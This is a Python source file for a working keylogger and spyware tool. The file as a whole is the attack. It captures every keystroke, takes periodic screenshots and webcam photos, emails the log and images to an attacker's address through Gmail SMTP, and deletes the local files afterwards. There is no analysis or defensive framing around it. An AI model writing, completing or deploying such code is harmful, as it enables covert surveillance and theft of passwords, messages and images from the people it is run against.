#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import cv2
import time
import smtplib
import threading
import pynput.keyboard
import pyautogui as pg
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

class Keylogger:
	def __init__(self, time_interval, number, email, password):
		self.i = 0
		self.n = 0
		self.log = 'Keylogger started'
		self.interval = time_interval
		self.number = number
		self.email = email
		self.password = password

	def append_log(self, string):
		self.log += string
		if len(self.log) >= self.number:
			self.report()

	def process_key_press(self, key):
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				current_key = ' '
			else:
				current_key = ' ' + str(key) + ' '
		self.append_log(current_key)

	def report(self):
		i = 1
		self.send_mail(self.email, self.password)
		self.log = ''
		while True:
			try:
				os.remove('screenshot' + str(i) + '.png')
				os.remove('img' + str(i) + '.png')
				i += 1
			except FileNotFoundError:
				break
		self.i = 0
		self.n = 0

	def screenshot(self):
		self.i += 1
		pg.screenshot('screenshot' + str(self.i) + '.png')
		self.webcam()
		timer = threading.Timer(self.interval, self.screenshot)
		timer.start()

	def webcam(self):
		self.n += 1
		cap = cv2.VideoCapture(0)
		ret, frame = cap.read()
		cv2.imwrite('img' + str(self.n) + '.png', frame)
		cap.release()

	def send_mail(self, email, password):
		i = 1
		n = 1
		msg = MIMEMultipart()
		msg['Subject'] = 'Данные'
		body = self.log
		msg.attach(MIMEText(body, 'plain')) 
		while True:
			try:
				part = MIMEApplication(open('screenshot' + str(i) + '.png', 'rb').read())
				part.add_header('Content-Disposition', 'attachment', filename = 'screenshot' + str(i) + '.png')
				msg.attach(part)
				part = MIMEApplication(open('img' + str(n) + '.png', 'rb').read())
				part.add_header('Content-Disposition', 'attachment', filename = 'img' + str(n) + '.png')
				msg.attach(part)
				i += 1
				n += 1
			except FileNotFoundError:
				server = smtplib.SMTP('smtp.gmail.com', 587)
				server.starttls()
				server.login(email, password)
				server.sendmail(email, email, msg.as_string())
				server.quit()
				break

	def start(self):
		keyboard = pynput.keyboard.Listener(on_press = self.process_key_press)
		with keyboard:
			self.report()
			self.screenshot()
			keyboard.join()

startlogger = Keylogger(60, 500, 'email', 'password')
startlogger.start()
